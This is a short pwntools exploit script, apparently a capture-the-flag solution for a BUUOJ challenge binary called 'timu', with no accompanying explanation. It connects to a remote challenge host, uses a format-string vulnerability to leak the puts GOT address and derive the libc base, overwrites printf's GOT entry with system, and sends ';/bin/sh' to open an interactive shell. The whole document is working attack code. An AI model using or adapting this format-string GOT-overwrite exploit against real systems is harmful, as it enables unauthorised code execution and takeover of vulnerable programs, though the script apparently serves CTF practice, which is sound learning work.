from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",25337)
elf=ELF("./timu")
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

printf_got=elf.got["printf"]
puts_got=elf.got["puts"]
payload=b'A'+p32(puts_got)+b"%8$s"
sh.recvuntil(b"Please tell me:")
sh.sendline(payload)
sh.recvuntil(b'A'+p32(puts_got))
puts_addr=u32(sh.recv(4))
print("puts_addr=",hex(puts_addr))
libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]

payload=b'A'+fmtstr_payload(8,{printf_got:system_addr},write_size='byte',numbwritten=0xa)
sh.sendline(payload)
sh.sendline(b";/bin/sh\x00")
sh.interactive()
